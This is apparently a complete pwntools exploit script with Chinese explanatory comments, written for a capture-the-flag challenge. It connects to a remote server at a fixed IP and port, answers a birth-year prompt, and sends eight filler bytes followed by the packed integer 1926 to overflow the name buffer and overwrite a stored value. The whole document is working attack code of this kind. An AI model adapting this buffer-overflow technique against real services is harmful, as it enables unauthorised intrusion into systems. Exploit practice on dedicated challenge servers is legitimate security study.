from pwn import *
#设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口
r = remote("111.200.241.244", 48285)
#设置payload，准备覆盖
payload = "a" * 8 
payload += p64(1926).decode('unicode_escape')
#这是接受消息，直到什么停止这样
r.recvuntil("What's Your Birth?\n")
#发送消息
r.sendline("2000")
r.recvuntil("What's Your Name?\n")
r.sendline(payload)
print(r.recv())
print(r.recv())
